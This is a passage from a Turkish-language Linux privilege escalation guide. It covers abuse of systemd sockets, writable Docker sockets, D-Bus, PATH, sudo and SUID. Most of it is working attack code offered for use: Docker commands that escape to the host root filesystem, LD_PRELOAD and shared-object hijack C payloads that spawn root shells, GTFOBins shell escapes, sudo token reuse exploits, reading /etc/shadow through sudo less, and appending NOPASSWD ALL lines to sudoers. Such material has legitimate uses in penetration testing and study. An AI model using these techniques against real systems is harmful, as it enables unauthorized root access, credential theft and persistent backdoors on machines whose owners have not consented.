```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

**Not:** **Zamanlayıcı**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerine bir sembolik bağ oluşturarak **etkinleştirilir**.

## Soketler

Unix Alan Soketleri (UDS), istemci-sunucu modelleri içinde aynı veya farklı makineler arasında **işlem iletişimi** sağlar. İnter-bilgisayar iletişimi için standart Unix tanımlayıcı dosyalarını kullanır ve `.socket` dosyaları aracılığıyla kurulur.

Soketler, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında daha fazla bilgi için `man systemd.socket`'e bakın.** Bu dosyanın içinde, birkaç ilginç parametre yapılandırılabilir:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır, ancak bir özet, soketin nereye dinleyeceğini **belirtmek için** kullanılır (AF\_UNIX soket dosyasının yolu, dinlemek için IPv4/6 ve/veya port numarası, vb.).
* `Accept`: Boolean bir argüman alır. Eğer **true** ise, her gelen bağlantı için bir **hizmet örneği oluşturulur** ve sadece bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri kendileri **başlatılan hizmet birimine geçirilir** ve tüm bağlantılar için yalnızca bir hizmet birimi oluşturulur. Bu değer, tek bir hizmet birimi tarafından koşullu olarak tüm gelen trafiği işleyen datagram soketleri ve FIFO'lar için yoksayılır. **Varsayılan olarak false**'dur. Performans nedenleriyle, yeni daemon'ları sadece `Accept=no` için uygun bir şekilde yazmanız önerilir.
* `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır, bunlar dinleme **soketleri**/FIFO'lar **oluşturulmadan önce** veya **sonra** **yürütülür**. Komut satırının ilk belirteci mutlaka mutlak bir dosya adı olmalıdır, ardından işlem için argümanlar gelir.
* `ExecStopPre`, `ExecStopPost`: Ek olarak, dinleme **soketleri**/FIFO'lar **kapatılmadan önce** veya **sonra** **kaldırılan** ek **komutlar**.
* `Service`: **Gelen trafiği aktive etmek için** **hizmet** birimi adını **belirtir**. Bu ayar yalnızca Accept=no olan soketler için izin verilir. Varsayılan olarak, soketle aynı ismi taşıyan hizmet (sonek değiştirilmiş olarak) kullanılmalıdır. Çoğu durumda, bu seçeneği kullanmanız gerekli olmayacaktır.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey ekleyebilirsiniz ve soket oluşturulmadan önce arka kapı çalıştırılacaktır. Bu nedenle, muhtemelen makine yeniden başlatılana kadar beklemeniz gerekecektir.\
_Not: Sistem, o soket dosyası yapılandırmasını kullanıyor olmalıdır; aksi takdirde arka kapı çalıştırılmaz._

### Yazılabilir soketler

Eğer **yazılabilir bir soket** (_şimdi Unix Soketleri hakkında konuşuyoruz ve `.socket` yapılandırma dosyaları hakkında değil_), o soketle **iletişim kurabilir** ve belki bir güvenlik açığından yararlanabilirsiniz.

### Unix Soketlerini Sıralama

```bash
netstat -a -p --unix
```

### Ham bağlantı

Bu bölümde, hedef sistemdeki bir kullanıcı hesabıyla doğrudan bir bağlantı kurmayı öğreneceksiniz. Bu, hedef sisteme erişim sağlamak için kullanışlı bir yöntemdir.

#### Netcat kullanarak bağlantı kurma

Netcat (nc) aracını kullanarak hedef sistemdeki bir bağlantı noktasına doğrudan bağlanabilirsiniz. Aşağıdaki komutu kullanarak hedef IP adresi ve bağlantı noktasını belirtin:

```bash
nc <hedef_IP> <bağlantı_noktası>
```

Örneğin, hedef IP adresi 192.168.1.10 ve bağlantı noktası 4444 ise, aşağıdaki komutu kullanabilirsiniz:

```bash
nc 192.168.1.10 4444
```

Bu komutu çalıştırdıktan sonra, hedef sistemdeki bağlantı noktasına doğrudan bir bağlantı kurulacak ve komutları doğrudan hedef sistemde çalıştırabileceksiniz.

#### Telnet kullanarak bağlantı kurma

Telnet aracını kullanarak da hedef sistemdeki bir bağlantı noktasına doğrudan bağlanabilirsiniz. Aşağıdaki komutu kullanarak hedef IP adresi ve bağlantı noktasını belirtin:

```bash
telnet <hedef_IP> <bağlantı_noktası>
```

Örneğin, hedef IP adresi 192.168.1.10 ve bağlantı noktası 4444 ise, aşağıdaki komutu kullanabilirsiniz:

```bash
telnet 192.168.1.10 4444
```

Bu komutu çalıştırdıktan sonra, hedef sistemdeki bağlantı noktasına doğrudan bir bağlantı kurulacak ve komutları doğrudan hedef sistemde çalıştırabileceksiniz.

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitasyon örneği:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP soketleri

Unutmayın ki bazı **HTTP isteklerini dinleyen soketler** olabilir (_burada .socket dosyalarından bahsetmiyorum, unix soketleri olarak hareket eden dosyalardan bahsediyorum_). Bunları aşağıdaki komutla kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```

Eğer soket bir HTTP isteğiyle yanıt verirse, onunla iletişim kurabilir ve belki de bazı güvenlik açıklarını sömürebilirsiniz.

### Yazılabilir Docker Soketi

Docker soketi, genellikle `/var/run/docker.sock` konumunda bulunan ve güvence altına alınması gereken önemli bir dosyadır. Varsayılan olarak, bu soket `root` kullanıcısı ve `docker` grubu üyeleri tarafından yazılabilir durumdadır. Bu sokete yazma erişiminin sahip olunması, ayrıcalık yükseltmeye yol açabilir. İşte bunun nasıl yapılabileceği ve Docker CLI kullanılamıyorsa alternatif yöntemlerin bir özeti:

#### Docker CLI ile Ayrıcalık Yükseltme

Eğer Docker soketine yazma erişiminiz varsa, aşağıdaki komutları kullanarak ayrıcalıkları yükseltebilirsiniz:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Bu komutlar, ana bilgisayarın dosya sistemine kök düzey erişim sağlayan bir konteyneri çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında, Docker soketi hala Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1. **Docker Görüntülerini Listeleme:** Kullanılabilir görüntülerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Bir Konteyner Oluşturma:** Ana sistem kök dizinini bağlayan bir konteyner oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan konteyneri başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Konteynere Bağlanma:** Konteynere bağlantı kurmak için `socat` kullanarak içinde komut yürütme yeteneği sağlayan bir bağlantı kurun.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, ana bilgisayarın dosya sistemine kök düzey erişimi olan konteynerde doğrudan komutları yürütebilirsiniz.

### Diğerleri

Docker soketi üzerinde yazma izinleriniz varsa çünkü **`docker`** grubunun içindesiniz, [**ayrıcalıkları yükseltmek için daha fazla yolunuz olabilir**](interesting-groups-linux-pe/#docker-group). [**Docker API bir bağlantı noktasında dinleniyorsa, onu tehlikeye atabilirsiniz**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Docker'i kırmak veya ayrıcalıkları yükseltmek için **daha fazla yol** için kontrol edin:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) ayrıcalık yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalıkları yükseltmek için bunu kötüye kullanabilirsiniz**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** ayrıcalık yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalıkları yükseltmek için bunu kötüye kullanabilirsiniz**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan sofistike bir **İşlem Arası İletişim (IPC) sistemi**dir. Modern Linux sistemleri göz önünde bulundurularak tasarlanmış olup, farklı türdeki uygulama iletişimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür ve süreçler arası veri alışverişini geliştiren temel IPC'yi destekler, geliştirilmiş UNIX etki alanı soketlerini hatırlatır. Ayrıca, olayları veya sinyalleri yayınlamaya yardımcı olur ve sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth hizmetinden gelen bir çağrı sinyali, bir müzik çaların sessizleşmesine neden olabilir ve kullanıcı deneyimini artırır. Ek olarak, D-Bus, hizmet isteklerini ve yöntem çağrılarını basitleştiren bir uzak nesne sistemi destekler ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, eşleşen politika kurallarının birikim etkisine dayanarak, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) yöneten bir **izin/izin verme modeli** üzerinde çalışır. Bu politikalar, ayrıcalıkların sömürülmesi yoluyla ayrıcalık yükseltmesine olanak tanıyabilecek şekilde bu izinlerin sömürülmesi yoluyla yönetilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir politika örneği, kök kullanıcının `fi.w1.wpa_supplicant1`'e ait mesajları sahiplenme, gönderme ve alma izinlerini ayrıntılı olarak belirtmektedir.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "varsayılan" bağlam politikaları diğer belirli politikalar tarafından kapsanmayan tüm uygulamalara uygulanır.

```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus İletişimini Nasıl Sıralayıp Sömürüleceğini Öğrenin:**

{% content-ref url="https://github.com/carlospolop/hacktricks/blob/tr/linux-hardening/privilege-escalation/d-bus-siralama-ve-komut-enjeksiyonu-privilege-escalation.md" %}
[https://github.com/carlospolop/hacktricks/blob/tr/linux-hardening/privilege-escalation/d-bus-siralama-ve-komut-enjeksiyonu-privilege-escalation.md](https://github.com/carlospolop/hacktricks/blob/tr/linux-hardening/privilege-escalation/d-bus-siralama-ve-komut-enjeksiyonu-privilege-escalation.md)
{% endcontent-ref %}

## **Ağ**

Her zaman ağın sıralamasını yapmak ve makinenin konumunu belirlemek ilginçtir.

### Genel sıralama

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```

### Açık Portlar

Erişim sağlamadan önce etkileşimde bulunamadığınız makinede çalışan ağ servislerini her zaman kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```

### Sniffing (Koku Alma)

Trafik koku alabilir misiniz diye kontrol edin. Eğer yapabiliyorsanız, bazı kimlik bilgilerini ele geçirebilirsiniz.

```
timeout 1 tcpdump
```

## Kullanıcılar

### Genel Sorgulama

Kendinizin kim olduğunu, hangi **yetkilere** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş yapabileceğini** ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT\_MAX** olan kullanıcıların ayrıcalıklarını yükseltmelerine izin veren bir hata tarafından etkilendi. Daha fazla bilgi için: [buraya](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [buraya](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [buraya](https://twitter.com/paragonsec/status/1071152249529884674) bakın.\
**Exploit etmek** için: **`systemd-run -t /bin/bash`**

### Gruplar

Kök ayrıcalıklarını size sağlayabilecek bir **grup üyesi** olup olmadığınızı kontrol edin:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Pano

Mümkünse, panoda ilginç bir şey olup olmadığını kontrol edin.

```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```

### Parola Politikası

Parola politikası, bir sistemde kullanıcıların parolalarının nasıl olması gerektiğini ve ne kadar güçlü olması gerektiğini belirleyen bir dizi kuraldır. Güçlü bir parola politikası, sistemlerin güvenliğini artırır ve yetkisiz erişim girişimlerine karşı koruma sağlar.

Bir parola politikası genellikle aşağıdaki unsurları içerir:

* **Parola Uzunluğu**: Parolaların belirli bir minimum uzunluğa sahip olması gerekmektedir. Genellikle en az 8 karakter önerilir.
* **Karmaşıklık Gereksinimleri**: Parolaların büyük harf, küçük harf, rakam ve özel karakterler gibi farklı karakter türlerini içermesi gerekmektedir.
* **Parola Süresi**: Parolaların belirli bir süre sonra değiştirilmesi gerekmektedir. Bu süre genellikle 90 gün olarak belirlenir.
* **Parola Geçmişi**: Kullanıcılar, belirli bir süre boyunca kullanılan parolaları tekrar kullanamazlar. Bu, parola tekrar kullanımını önlemek için önemlidir.
* **Hesap Kilitlenmesi**: Belirli bir sayıda başarısız giriş denemesinden sonra hesapların otomatik olarak kilitlenmesi gerekmektedir. Bu, brute force saldırılarına karşı koruma sağlar.

Bir sistem yöneticisi, parola politikasını yapılandırarak kullanıcıların güçlü parolalar kullanmasını sağlayabilir ve sistem güvenliğini artırabilir.

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen şifreler

Eğer ortamın herhangi bir şifresini biliyorsanız, her kullanıcı için şifreyi kullanarak giriş yapmayı deneyin.

### Su Brute

Eğer çok fazla gürültü yapmaktan çekinmiyorsanız ve bilgisayarda `su` ve `timeout` ikilisi bulunuyorsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force yöntemiyle deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle kullanıcıları brute-force etmeyi deneyebilir.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer $PATH'in içindeki bazı klasörlere yazma izniniz olduğunu fark ederseniz, yazılabilir klasöre **geri kapı** olarak kullanılmak üzere farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adını taşıyan bir geri kapı oluşturarak ayrıcalıkları yükseltebilirsiniz. Bu geri kapı, $PATH'teki yazılabilir klasörünüzden önceki bir klasörden yüklenmeyen bir klasörden yüklenmelidir.

### SUDO ve SUID

Sudo kullanarak bazı komutları çalıştırmanıza izin verilebilir veya suid biti olabilir. Bunun için aşağıdaki komutu kullanarak kontrol edebilirsiniz:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar, dosyaları okumanıza ve/veya yazmanıza hatta bir komutu çalıştırmanıza olanak tanır.** Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeksizin başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```

Bu örnekte, `demo` kullanıcısı `root` olarak `vim` çalıştırabilir, şimdi bir ssh anahtarı ekleyerek veya `sh` çağırarak bir kabuk almak çok kolaydır.

```
sudo vim -c '!sh'
```

### SETENV

Bu yönerge, bir şeyi yürütürken kullanıcının bir ortam değişkeni **ayarlamasına izin verir**:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, HTB makinesi Admirer'a dayanmaktadır ve kök olarak betiği çalıştırırken keyfi bir python kütüphanesini yüklemek için PYTHONPATH yönlendirmesine karşı savunmasızdır:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Sudo yolu atlayarak çalıştırma

Diğer dosyaları okumak veya sembolik bağlantıları kullanmak için **atla**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Eğer bir **joker karakter** (\*) kullanılıyorsa, işler daha da kolaylaşır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeden sudo komutu/SUID ikili dosyası

Eğer **sudo izni** bir komuta **yol belirtilmeden verilmişse**: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu istismar edebilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu teknik ayrıca bir **suid** ikili dosyası, **yolu belirtmeden başka bir komutu çalıştırıyorsa (her zaman tuhaf bir SUID ikili dosyanın içeriğini** _**strings**_ **ile kontrol edin)** kullanılabilir.

[Çalıştırılacak payload örnekleri.](payloads-to-execute.md)

### Komut yolunu belirten SUID ikili dosya

Eğer **suid** ikili dosyası **yolu belirterek başka bir komut çalıştırıyorsa**, o zaman, suid dosyanın çağırdığı komutla aynı isme sahip bir fonksiyon oluşturmayı deneyebilirsiniz.

Örneğin, bir suid ikili dosya _**/usr/sbin/service apache2 start**_ komutunu çağırıyorsa, bu komutu içeren bir fonksiyon oluşturup onu export etmeyi denemelisiniz:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** çevresel değişkeni, yükleyicinin diğer tüm kütüphanelerden önce, standart C kütüphanesi (`libc.so`) dahil olmak üzere bir veya daha fazla paylaşımlı kütüphaneyi (.so dosyaları) yüklemek için kullanılır. Bu işlem, bir kütüphanenin önceden yüklenmesi olarak bilinir.

Ancak, sistem güvenliğini korumak ve özellikle **suid/sgid** yürütülebilir dosyalarda bu özelliğin kötüye kullanılmasını önlemek için sistem belirli koşulları uygular:

* Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkin kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalarda **LD\_PRELOAD**'u dikkate almaz.
* Suid/sgid olan yürütülebilir dosyalar için, yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Ayrıcalık yükseltme, `sudo` ile komutları çalıştırma yeteneğine sahipseniz ve `sudo -l` çıktısı **env\_keep+=LD\_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD\_PRELOAD** çevresel değişkeninin kalıcı olmasına ve `sudo` ile komutlar çalıştırıldığında tanınmasına olanak tanır, bu da potansiyel olarak yükseltilmiş ayrıcalıklarla keyfi kodun yürütülmesine yol açabilir.

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** olarak kaydedin.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Ardından, aşağıdaki komutu kullanarak **derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, **ayrıcalıkları yükseltmek** için çalıştırın.

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

{% hint style="danger" %}
Benzer bir ayrıcalık yükseltme saldırısı, saldırganın **LD\_LIBRARY\_PATH** çevresel değişkenini kontrol ettiği durumlarda kullanılabilir çünkü saldırgan kütüphanelerin aranacağı yolu kontrol eder.
{% endhint %}

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so enjeksiyonu

Sıradışı görünen **SUID** izinlerine sahip bir ikili dosya ile karşılaşıldığında, **.so** dosyalarını düzgün bir şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu kontrol aşağıdaki komutu çalıştırarak yapılabilir:

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Böyle bir dosya veya dizin yok)"_ gibi bir hata ile karşılaşmak, bir saldırı potansiyeli olduğunu düşündürür.

Bunu sömürmek için, aşağıdaki kodu içeren bir C dosyası oluşturulur, diyelim ki _"/path/to/.config/libcalc.c"_:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("/bin/bash -p");
}
```

Bu kod, _libcalc.so_ dosyasının oluşturulmasını ve ardından kötü niyetli bir kabuk açılmasını sağlar. Bu, hedef sistemin yetki yükseltme saldırısına maruz kalmasına neden olabilir.

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir kabuk çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını paylaşılan bir nesne (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID ikili dosyasını çalıştırmak, potansiyel sistem tehlikesine yol açan saldırıyı tetiklemelidir.

## Paylaşılan Nesne Kaçırma

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Şimdi, yazma iznimizin olduğu bir klasörden bir kütüphane yükleyen bir SUID ikili bulduğumuza göre, o klasöre gerekli isimle bir kütüphane oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```

Eğer şu gibi bir hata alırsanız:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

Bu, oluşturduğunuz kütüphanenin `a_function_name` adında bir işlev içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir saldırganın yerel güvenlik kısıtlamalarını atlamak için kullanabileceği Unix ikili dosyalarının bir derlemesidir. [**GTFOArgs**](https://gtfoargs.github.io/), yalnızca bir komuta argüman enjekte edebileceğiniz durumlar için aynı işlevi görür.

Bu proje, kısıtlanmış kabukları kırmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bağlama ve ters kabuklar oluşturmak ve diğer saldırı sonrası görevleri kolaylaştırmak için kullanılabilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l`'ye erişebiliyorsanız, aracı [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kullanarak herhangi bir sudo kuralını nasıl sömürüleceğini kontrol edebilirsiniz.

### Sudo Token'larını Tekrar Kullanma

**sudo erişiminiz** var ancak şifreniz yoksa, ayrıcalıkları **bir sudo komutunun yürütülmesini bekleyerek ve ardından oturum belirtecinin ele geçirilmesiyle** yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

* Zaten "_sampleuser_" kullanıcısı olarak bir kabuğa sahipsiniz
* "_sampleuser_" **son 15 dakika içinde `sudo`** kullanarak bir şeyleri yürütmüştür (varsayılan olarak bu, herhangi bir şifre girmeden `sudo` kullanmamıza izin veren sudo belirteci süresidir)
* `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0
* `gdb` erişilebilir durumda (yükleyebilmeniz gerekmektedir)

(`ptrace_scope` geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutuyla etkinleştirilebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirerek `kernel.yama.ptrace_scope = 0` olarak ayarlanabilir)

Eğer tüm bu gereksinimler karşılanıyorsa, ayrıcalıkları yükseltebilirsiniz: [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **İlk saldırı** (`exploit.sh`), _/tmp_ dizininde `activate_sudo_token` adlı ikili dosyayı oluşturacaktır. Bu dosyayı kullanarak oturumunuzda sudo belirtecinizi **etkinleştirebilirsiniz** (otomatik olarak kök kabuğa geçmeyeceksiniz, `sudo su` komutunu kullanın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

* İkinci saldırı (`exploit_v2.sh`), _/tmp_ dizininde **root sahibi ve setuid ayarına sahip** bir sh kabuğu oluşturacaktır.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

* Üçüncü saldırı (`exploit_v3.sh`), **sudo jetonlarını sonsuz hale getiren ve tüm kullanıcılara sudo kullanma izni veren bir sudoers dosyası oluşturacak**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Kullanıcı Adı>

Eğer bu klasörde veya klasör içinde oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) adlı ikili dosyayı kullanarak bir kullanıcı ve PID için **sudo belirteci oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabilir ve PID'si 1234 olan o kullanıcıyla bir kabukta bulunuyorsanız, şifreyi bilmeksizin sudo ayrıcalıklarını **elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanabileceğini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
Eğer bu dosyayı **okuyabiliyorsanız**, bazı **ilginç bilgiler elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabilirseniz**, ayrıcalıkları **yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Eğer yazabilirseniz, bu izni kötüye kullanabilirsiniz.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

